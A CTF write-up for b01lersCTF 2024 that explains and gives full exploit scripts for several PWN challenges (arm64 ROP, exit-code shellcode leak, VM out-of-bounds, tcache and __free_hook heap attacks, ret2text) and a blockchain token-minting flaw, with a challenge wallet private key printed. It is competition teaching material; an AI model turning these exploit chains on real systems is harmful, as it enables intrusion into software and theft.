---
title: WriteUp - b01lersCTF2024 - PWN && Blockchain
date: 2024-04-15
draft: false
tags:
  - WriteUp
  - PWN
---
> [!info] 
> Recently, I've been extremely busy, and a few key members of our team were also occupied with preparing for quizzes this weekend, so we did not participate in Plaid CTF ~~坐牢~~ for the excitement. Fortunately, we chose b01lers CTF as our weekly training, which provided a very enjoyable problem-solving experience.


In this competition, I achieved AK for all the challenges under PWN and Blockchain categories. Among these, `mixtapeailbc`, `Zero to Hero`, and `seeing-red` were all first blood.

![[static/b01lers-wp-fig1.png|340]]    ![[static/b01lers-wp-fig2.png|300]]

## PWN

### arm-and-a-leg

#arm

This is my first time encountering a PWN challenge on the arm64 architecture. Fortunately, our team recently purchased a new Mac Studio with an M2 Max chip 😋:

![[static/b01lers-wp-fig3.png]]

Thanks to this, I can easily start a Docker and script while debugging with `pwndbg`, just as I would with problems on the `x86_64` architecture.

#### Analysis

The challenge has two vulnerabilities: a format string vulnerability in the `get_address` function and a stack overflow in the `feedback` function, and there is no address randomization in the problem (no `PIE`). Therefore, theoretically, either one of these vulnerabilities alone should be sufficient to exploit.

However, combining the two vulnerabilities is generally a simpler approach:

1. First, use the format string vulnerability to leak the canary and libc addresses.
2. Then, exploit a stack overflow to overwrite the **return address of the previous function**. This is because the `ret` instruction on the arm64 architecture actually executes `mov pc, x30`. A shorter stack overflow cannot disrupt the current function's execution flow, only allowing for the modification of the next function's return address. This also serves as a mitigation measure for stack overflows under the arm64 architecture.
3. The final step is to use ROP to call `system("/bin/sh\x00")`.

It is worth noting the function calling conventions and stack layout of the arm64 architecture:

- When calling functions, the arm64 architecture requires the first four arguments to be placed in `x0`, `x1`, `x2`, and `x3` respectively. Any additional arguments beyond the first four are placed on the stack.
- The stack layout includes, in order, the stack address, return values, local variables, canary, the stack address of the next function, and the return address of the next function.

```c
pwndbg> stack
00:0000│ x29 sp 0xffffe7f7bcd0 —▸ 0xffffe7f7bd50 —▸ 0xffffe7f7bd70 —▸ 0xffffe7f7be80 ◂— 0x0
01:0008│        0xffffe7f7bcd8 —▸ 0x4009d8 (main+176) // cur ret addr (hard to be changed by stack overflow)
02:0010│ x0     0xffffe7f7bce0 ◂— 0xdeadbeef
// ...
0f:0078│        0xffffe7f7bd48 ◂— 0x5992bd6412bc0300 // canary
10:0080│        0xffffe7f7bd50 —▸ 0xffffe7f7bd70 —▸ 0xffffe7f7be80 ◂— 0x0
11:0088│        0xffffe7f7bd58 —▸ 0xffffa5ea73fc // next ret addr (our target)
// ...
```

![[static/b01lers-wp-fig4.png]]
#### Exploitation

For exploitation, the approach can be based on the previous ideas:

1. Format string leak:

```python
io.recvuntil(
    b"Wow, you may now purchase an appendage!\tCould we have an address to ship said appendage? "
)
input("debug")
io.sendline(b"%8$p.%15$p.%21$p.")

io.recvuntil(b"Thanks, we will ship to: ")
stack_base = int(io.recvuntil(b".", drop=True), 16)
canary = int(io.recvuntil(b".", drop=True), 16)
libc_base = int(io.recvuntil(b".", drop=True), 16) - 0x274CC
```

2. Completing ROP with a stack overflow, where constructing the ROP chain also troubled me for a while since the lack of a `pop` instruction felt quite uncomfortable. However, there are always enough gadgets in libc. The following statement can be used to set up the registers:

```z80
ldp x19, x20, [sp, #0x10] ; x19 in sp+0x10, x20 in sp+0x18
ldp x21, x22, [sp, #0x20] ; x21 in sp+0x20, x22 in sp+0x28
ldp x23, x24, [sp, #0x30] ; same
ldp x29, x30, [sp], #0x40 ; x29 in sp+0x00, x30 in sp+0x08
						  ; after that, sp += 0x40
ret                       ; ret to x30
```

3. Finally, there're gadgets for calling one reg with args in another reg. In my case, I got this one:

```z80
mov x0, x23
blr x22
```

#### Final exp.py

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "aarch64"
context.log_level = "debug"

io = remote("arm-and-a-leg.gold.b01le.rs", 1337)
# io = process("./chal")
elf = ELF("./chal")
libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")

io.recvuntil(b"2. Legs\n")
io.sendline(str(2).encode())
io.recvuntil(b"What number am I thinking of?\n")
io.sendline(str(1337).encode())

io.recvuntil(
    b"Wow, you may now purchase an appendage!\tCould we have an address to ship said appendage? "
)
input("debug")
io.sendline(b"%8$p.%15$p.%21$p.")

io.recvuntil(b"Thanks, we will ship to: ")
stack_base = int(io.recvuntil(b".", drop=True), 16)
canary = int(io.recvuntil(b".", drop=True), 16)
libc_base = int(io.recvuntil(b".", drop=True), 16) - 0x274CC

log.info("stack_base: " + hex(stack_base))
log.info("canary: " + hex(canary))
log.info("libc_base: " + hex(libc_base))

csu_gadget1 = 0x000000000003133C + libc_base
# 0x00000000000e3e90: mov x0, x23; blr x22;
gadget2 = 0x00000000000E3E90 + libc_base

io.recvuntil(b"Care to leave some feedback?!\n")
payload = b"a" * 0x68
payload += flat(
    [
        canary,
        stack_base + 0x130,
        csu_gadget1,
        0,
        canary,
        0,
        gadget2,
        0x19,
        0x20,
        0x21,
        libc_base + libc.symbols["system"],
        libc_base + next(libc.search(b"/bin/sh\x00")),
    ]
)
io.sendline(payload)

io.interactive()
```

---
### Zero to Hero

#sidechannel #sandbox

The first point was that the problem provided no output and _appeared to_ clear the registers. However, upon closer consideration, it’s worth asking: were the segment registers also cleared? For example, the `fs` register is typically used to point to specific data segments, such as Thread Local Storage (TLS), and one can calculate the stack address or libc address based on where it points.

Additionally, there was no output function provided during the execution of the shellcode, but this is usually addressed using a loop and a timing side-channel to obtain the flag. In this case, it’s even simpler: the remote environment even provides a return value!

Thus, after using the `fs` register to locate the position of the flag in memory, the flag can be output byte by byte using the return value of the program exit:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import success
from pwn import *
import time

context.arch = "amd64"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

# io = process("./z2h")

ans = ""

for i in range(0x100):
    io = remote("gold.b01le.rs", 4005)
    shellcode = asm(f"""
        mov r12, fs:[0x00];
        sub r12, {0x3fc0 - 0x80}; // environ
        mov r13, [r12];
        sub r13, 0x30;
        mov r15, [r13];
        add r15, 0x2c12;

        movzx rdi, byte ptr [r15 + {i}];
        mov rax, 60;
        syscall;
    """).hex()

    ru(b"input: ")
    sl(shellcode)
    ru(b"return value: ")
    data = chr(int(rl()))
    io.close()
    ans += data
    print(ans)
```

The results are as follows:

![[static/b01lers-wp-fig5.png]]

---
### mixtpeailbc

#vm

It's a somewhat cumbersome virtual machine with 39 instructions, including memory operations, calculations, and output. However, I've encountered many cumbersome VM PWNs in domestic competitions, so settling down to reverse-engineer it felt manageable.
#### Analysis

At the very beginning, I noticed the output function by searching the references of `putchar`, then I decided to reverse the VM instruction's structure from that output function. However, after sending a `p32(0xdeadbeef)` I noticed my offset became negative. After debugging in gdb, I identified that this function has a negative overflow issue:

```c
__int64 __fastcall get_p16_arg(__int64 a1, unsigned int a2)
{
  unsigned __int8 middle_byte; // [rsp+1Eh] [rbp-2h]

  middle_byte = get_HIWORD(a2);
  return *(_QWORD *)(a1 + 8 * (middle_byte + 0x26LL) + 8) + (char)get_HIBYTE(a2);
}
```

However, there is an overflow check after the output function. I further searched for other cross-references to the `get_p16_arg` function and then got this one, which leads to control-flow-hijacking:

```c
void __fastcall sub_1850(__int64 a1, unsigned int a2)
{
  unsigned __int64 i; // [rsp+18h] [rbp-158h]
  unsigned __int64 j; // [rsp+20h] [rbp-150h]
  __int64 v4; // [rsp+28h] [rbp-148h]
  __int64 v5[39]; // [rsp+30h] [rbp-140h]
  unsigned __int64 v6; // [rsp+168h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v4 = get_p16_arg(a1, a2) + 0x930 + a1 + 8;
  for ( i = 0LL; i <= 0x26; ++i )
    v5[i] = *(_QWORD *)(a1 + 8 * i);
  for ( j = 0LL; j <= 0x26; ++j )
    *(_QWORD *)(a1 + 8 * j) = v5[*(unsigned __int8 *)(v4 + j)];
  next_i(a1);
}
```

After reviewing all the functionalities, I confirmed that each instruction in the VM is 4 bytes. The first two bytes often seem to be used for memory addressing, and the third byte usually serves as the primary argument.

#### Exploitation

At the start of the exploitation, I attempted to write a payload that could hijack the control flow to `0xcafebad0deadbeef` to validate the correctness of the above analysis:

```python
# 0x7fffffffd498 —▸ 0x7ffff7df9083 (__libc_start_main+243)

# -2532 = 0xfffffffffffff6d0
# target= 0xfffffffffffff810 (0x148)

bytecode = flat(
    [
        # write 0xfffffffffffff810
        0xF810F906,
        0xFFFFF907,
        0xFFFFF908,
        0xFFFFF909,
        # write 0xdeadbeef
        0xBEEF0106,
        0xDEAD0107,
        0xBAD00108,
        0xCAFE0109,
        # write 0x26
        0x015C0206,
        0x03020207,
        0x05040208,
        0x07060209,
        0x09080306,
        0x0B0A0307,
        0x0D0C0308,
        0x0F0E0309,
        0x11100406,
        0x13120407,
        0x15140408,
        0x17160409,
        0x19180506,
        0x1B1A0507,
        0x1D1C0508,
        0x1F1E0509,
        0x21200606,
        0x23220607,
        0x25240608,
        0x27260609,
        # trigger vuln
        0x00F9FF03,
        0x00000000,
    ],
    word_size=32,
)
```

The analysis proved to be very accurate, as I successfully hijacked the function table entries and controlled several parameters to be zero. Therefore, my plan was to invoke `one_gadget` to achieve `get_shell`.

But how to obtain the libc address? This puzzled me for a long time, until I finally realized that the memory copying functionality was intended for acquiring addresses:

```c
unsigned __int64 __fastcall sub_1966(__int64 a1, unsigned int a2)
{
  unsigned __int8 v3; // [rsp+17h] [rbp-829h]
  unsigned __int64 i; // [rsp+18h] [rbp-828h]
  unsigned __int64 j; // [rsp+20h] [rbp-820h]
  __int64 v6; // [rsp+28h] [rbp-818h]
  __int64 v7[257]; // [rsp+30h] [rbp-810h]
  unsigned __int64 v8; // [rsp+838h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v3 = get_last8_arg(a2);
  v6 = get_p16_arg(a1, a2) + 0x930 + a1 + 8;
  for ( i = 0LL; i <= 0xFF; ++i )
    v7[i] = *(_QWORD *)(a1 + 8 * (i + 38) + 8);
  for ( j = 0LL; j < v3; ++j )
    *(_QWORD *)(a1 + 8 * (j + 38) + 8) = v7[*(unsigned __int8 *)(v6 + j)];
  next_i(a1);
  return __readfsqword(0x28u) ^ v8;
}
```

By exploiting an out-of-bounds condition, it's possible to treat a piece of data on the stack as an array index. I identified `__libc_start_main+243` because its last byte is fixed. To prevent errors, I pre-set the value corresponding to 0x83 to be the VM's PC pointer.

#### Final exp.py

After that, I performed some calculations to get `one_gadget` in VM memory and realized `get_shell`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

# 0x7fffffffd498 —▸ 0x7ffff7df9083 (__libc_start_main+243)

# -2532 = 0xfffffffffffff6d0
# target= 0xfffffffffffff810 (0x148)

bytecode_list = []

for i in range(1, 0xFF + 1):
    bytecode_list += [((i << 16) | (i << 8) | 0x06)]

bytecode_list[0] = 0x00830106
bytecode_list[0x83] = 0x04008306

bytecode = flat(
    bytecode_list,
    word_size=32,
)

bytecode += flat(
    [
        0x8010FA06,
        0x00FA0804,
        # calcu libc_base
        0x28050526,
        0x20040426,
        0x18030326,
        0x10020226,
        0x08010126,
        0x83010114,
        0x02010113,
        0x03010113,
        0x04010113,
        0x05010113,
        # calcu onegadget
        0xFA7E0206,
        0x000B0306,
        0x10030326,
        0x03020213,
        0x02010113,
        # write 0xfffffffffffff810
        0xF810F906,
        0xFFFFF907,
        0xFFFFF908,
        0xFFFFF909,
        # write
        # 0xBEEF0106,
        # 0xDEAD0107,
        # 0xBAD00108,
        # 0xCAFE0109,
        # write 0x26
        0x015C0206,
        0x03020207,
        0x05040208,
        0x07060209,
        0x09080306,
        0x0B0A0307,
        0x0D0C0308,
        0x0F0E0309,
        0x11100406,
        0x13120407,
        0x15140408,
        0x17160409,
        0x19180506,
        0x1B1A0507,
        0x1D1C0508,
        0x1F1E0509,
        0x21200606,
        0x23220607,
        0x25240608,
        0x27260609,
        # trigger vuln
        0x00F9FF03,
        0x00000000,
    ],
    word_size=32,
)

open("aaa.bin", "wb").write(bytecode)
print(len(bytecode))
```

The results are as follows:

![[static/b01lers-wp-fig6.png]]

---
### seeing-red

There are two vulnerabilities: first, use a stack overflow to call `use_ticket` to load the flag onto the stack (note that the stack alignment needs to be adjusted using `ret`), and then use a format string to print the flag.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

ru(b"Do you know where it could be?! \n")
sl(b"a" * 0x48 + p64(0x000000000040139D) + p64(0x401216) + p64(0x40131F))

ru(b"sooo... anyways whats your favorite Taylor Swift song? ")
sl(b"%p%p%p%p%s")

ia()
```

The results are as follows:

![[static/b01lers-wp-fig7.png]]

---
### medium-note

From heap to stack:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("./libc-2.36.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"-----Resize----\n")
    sl(i2b(choice))


def add(idx, size):
    cmd(1)
    ru(b"Where? ")
    sl(i2b(idx))
    ru(b"size? ")
    sl(i2b(size))


def delet(idx):
    cmd(2)
    ru(b"Where? ")
    sl(i2b(idx))


def show(idx):
    cmd(3)
    ru(b"Where? ")
    sl(i2b(idx))


def edit(idx, data):
    cmd(4)
    ru(b"Where? ")
    sl(i2b(idx))
    s(data)


add(0, 0x200)
add(1, 0x200)
add(2, 0x200)
add(3, 0x200)
add(5, 0x520)
add(4, 0x200)
delet(0)
delet(1)
show(0)
heap_key = u64_ex(rn(5))
lg("heap_key", heap_key)
heap_base = heap_key << 12
lg("heap_base", heap_base)

delet(5)
show(5)
libc_base = u64_ex(rn(6)) - 0x1D1CC0
lg("libc_base", libc_base)

delet(2)
delet(3)

edit(3, p64((libc_base + libc.sym.environ) ^ heap_key))
add(6, 0x200)
add(7, 0x200)
show(7)
stack_base = u64_ex(rn(6)) - 0x158 - 0x10
lg("stack_base", stack_base)

add(8, 0x120)
add(9, 0x120)
add(10, 0x120)
add(11, 0x120)
delet(9)
delet(11)
delet(8)
delet(10)

edit(10, p64((stack_base) ^ heap_key))
add(12, 0x120)
add(13, 0x120)
pop_rdi_ret = libc_base + 0x000000000002AA82

edit(
    13,
    p64(0) * 3
    + p64(pop_rdi_ret)
    + p64(libc_base + next(libc.search(b"/bin/sh\x00")))
    + p64(libc_base + libc.sym.system),
)

ia()
```

---
### easy-note

Tcache attack:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    # ru(b">")
    sl(i2b(choice))


def add(idx, size):
    cmd(1)
    ru(b"Where? ")
    sl(i2b(idx))
    ru(b"size? ")
    sl(i2b(size))


def delet(idx):
    cmd(2)
    ru(b"Where? ")
    sl(i2b(idx))


def show(idx):
    cmd(3)
    ru(b"Where? ")
    sl(i2b(idx))


def edit(idx, size, data):
    cmd(4)
    ru(b"Where? ")
    sl(i2b(idx))
    ru(b"size? ")
    sl(i2b(size))
    s(data)


add(0, 0x100)
add(1, 0x100)
add(2, 0x100)
add(3, 0x520)
add(4, 0x100)

delet(1)
delet(0)
delet(3)
show(3)
libc_base = u64_ex(rn(6)) - 0x3AFCA0
lg("libc_base", libc_base)
edit(0, 0x100, p64(libc_base + libc.sym.__free_hook))


def add(idx, size):
    cmd(1)
    # ru(b"Where? ")
    sl(i2b(idx))
    # ru(b"size? ")
    sl(i2b(size))


add(5, 0x100)
add(6, 0x100)
edit(6, 0x100, p64(libc_base + libc.sym.system))
edit(5, 0x100, b"/bin/sh\x00")
delet(5)


ia()
```

---
### shall-we-play-a-game

Ret2text:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

for i in range(3):
    rl()
    sl(b"a")
ru(b"SHALL WE PLAY A GAME?\n")
sl(b"a" * 0x48 + p64(0x4011DD))

ia()
```

---

## Blockchain

### burgercoin

#blockchain

Initially, I discovered that `totalSupply` is of int type, and there were no checks on it, so I tried a negative overflow in stage0, but it seemed useless. I first thought of causing an integer overflow to reduce `balances` to 0, but that seemed to require $2^{255}$ attempts, which was unreasonable; however, I found that the method could infinitely increase the `balances` of the owner, and `totalSupply` would decrease indefinitely. Thus, I considered creating a new wallet address into which I could deposit unlimited money (initially transferring a small amount for transaction gas).

Using the above method, I could exploit the system to infinitely generate money:

```python
from threading import Thread

from web3 import Web3, middleware
from web3.gas_strategies.time_based import medium_gas_price_strategy

rpc_endpoint = "http://gold.b01le.rs:8545/a6ab7d2d-746e-4cc2-90b4-d52f695b4ec7"
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))


contract_address = "0x01DF296fA4321Af2b3F82dE2D5a8602B1F054630"
contract_abi = [
    {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
    {
        "inputs": [{"internalType": "address", "name": "to", "type": "address"}],
        "name": "giveBurger",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "address", "name": "user", "type": "address"}],
        "name": "getBalance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "purchaseBurger",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "totalSupply",
        "outputs": [{"internalType": "int256", "name": "", "type": "int256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"},
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "address", "name": "newOwner", "type": "address"}],
        "name": "transferBurgerjointOwnership",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
]

contract = w3.eth.contract(address=contract_address, abi=contract_abi)


attacker_private_key = (
    "0x7d319f70af7724d9c6c83c8282c75bbf69c9f2d8c4dc03a751e28f082f327bac"
)
attacker = w3.eth.account.from_key(attacker_private_key)
w3.eth.default_account = attacker.address

stage = 2

owner = contract.functions.owner().call()
tx = contract.functions.transferBurgerjointOwnership(
    attacker.address
).build_transaction(
    {
        "from": attacker.address,
        "gas": 1000000,
        "nonce": w3.eth.get_transaction_count(attacker.address),
    }
)
signed_tx = attacker.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
w3.eth.wait_for_transaction_receipt(tx_hash)

tx = contract.functions.transfer(
    owner, contract.functions.getBalance(attacker.address).call()
).build_transaction(
    {
        "from": attacker.address,
        "gas": 1000000,
        "nonce": w3.eth.get_transaction_count(attacker.address),
    }
)
signed_tx = attacker.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
w3.eth.wait_for_transaction_receipt(tx_hash)

owner = contract.functions.owner().call()
print(contract.functions.getBalance(owner).call())
print(contract.functions.getBalance(attacker.address).call())
print(contract.functions.isSolved().call())
total_supply = contract.functions.totalSupply().call()
print(f"Current totalSupply: {total_supply}")
exit()


if stage == 0:
    while 1:
        tx = contract.functions.purchaseBurger().build_transaction(
            {
                "from": attacker.address,
                "gas": 1000000,
                "nonce": w3.eth.get_transaction_count(attacker.address),
            }
        )
        signed_tx = attacker.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)

        tx = contract.functions.transfer(
            contract.functions.owner().call(), 1
        ).build_transaction(
            {
                "from": attacker.address,
                "gas": 1000000,
                "nonce": w3.eth.get_transaction_count(attacker.address),
            }
        )
        signed_tx = attacker.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        receipt = w3.eth.get_transaction_receipt(tx_hash)
        if receipt["status"] == 1:
            print("Transaction succeeded.")
        else:
            print("Transaction failed.")

        owner = contract.functions.owner().call()
        print(contract.functions.getBalance(owner).call())
        print(contract.functions.getBalance(attacker.address).call())
        print(contract.functions.isSolved().call())
        total_supply = contract.functions.totalSupply().call()
        print(f"Current totalSupply: {total_supply}")
    exit()

elif stage == 1:
    owner = contract.functions.owner().call()

    tx = contract.functions.purchaseBurger().build_transaction(
        {
            "from": attacker.address,
            "gas": 1000000,
            "nonce": w3.eth.get_transaction_count(attacker.address),
        }
    )

    # tx = contract.functions.giveBurger(attacker.address).build_transaction(
    #     {
    #         "from": attacker.address,
    #         "gas": 1000000,
    #         "nonce": w3.eth.get_transaction_count(attacker.address),
    #     }
    # )

    # tx = contract.functions.transfer(attacker.address, 1).build_transaction(
    #     {
    #         "from": attacker.address,
    #         "gas": 1000000,
    #         "nonce": w3.eth.get_transaction_count(attacker.address),
    #     }
    # )

    signed_tx = attacker.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)

    receipt = w3.eth.get_transaction_receipt(tx_hash)
    if receipt["status"] == 1:
        print("Transaction succeeded.")
    else:
        print("Transaction failed.")

    print(contract.functions.getBalance(owner).call())
    print(contract.functions.getBalance(attacker.address).call())
    print(contract.functions.isSolved().call())
    total_supply = contract.functions.totalSupply().call()
    print(f"Current totalSupply: {total_supply}")

    new_account = w3.eth.account.create()
    tx = {
        "to": new_account.address,
        "value": w3.to_wei(1, "ether"),
        "gas": 21000,
        "gasPrice": w3.to_wei("20", "gwei"),
        "nonce": w3.eth.get_transaction_count(attacker.address),
    }
    signed_tx = attacker.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print(contract.functions.getBalance(attacker.address).call())
    print(contract.functions.getBalance(new_account.address).call())
    print(contract.functions.isSolved().call())
    total_supply = contract.functions.totalSupply().call()
    print(f"Current totalSupply: {total_supply}")

    for i in range(31):
        tx = contract.functions.purchaseBurger().build_transaction(
            {
                "from": attacker.address,
                "gas": 1000000,
                "nonce": w3.eth.get_transaction_count(attacker.address),
            }
        )
        signed_tx = attacker.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)

        tx = contract.functions.transfer(new_account.address, 1).build_transaction(
            {
                "from": attacker.address,
                "gas": 1000000,
                "nonce": w3.eth.get_transaction_count(attacker.address),
            }
        )
        signed_tx = attacker.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        receipt = w3.eth.get_transaction_receipt(tx_hash)
        if receipt["status"] == 1:
            print("Transaction succeeded.")
        else:
            print("Transaction failed.")

        print(contract.functions.getBalance(new_account.address).call())
        print(contract.functions.getBalance(attacker.address).call())
        print(contract.functions.isSolved().call())
        total_supply = contract.functions.totalSupply().call()
        print(f"Current totalSupply: {total_supply}")

    tx = contract.functions.transfer(
        attacker.address, contract.functions.getBalance(new_account.address).call()
    ).build_transaction(
        {
            "from": new_account.address,
            "gas": 1000000,
            "nonce": w3.eth.get_transaction_count(new_account.address),
        }
    )
    signed_tx = new_account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    receipt = w3.eth.get_transaction_receipt(tx_hash)
    if receipt["status"] == 1:
        print("Transaction succeeded.")
    else:
        print("Transaction failed.")

    exit()
```
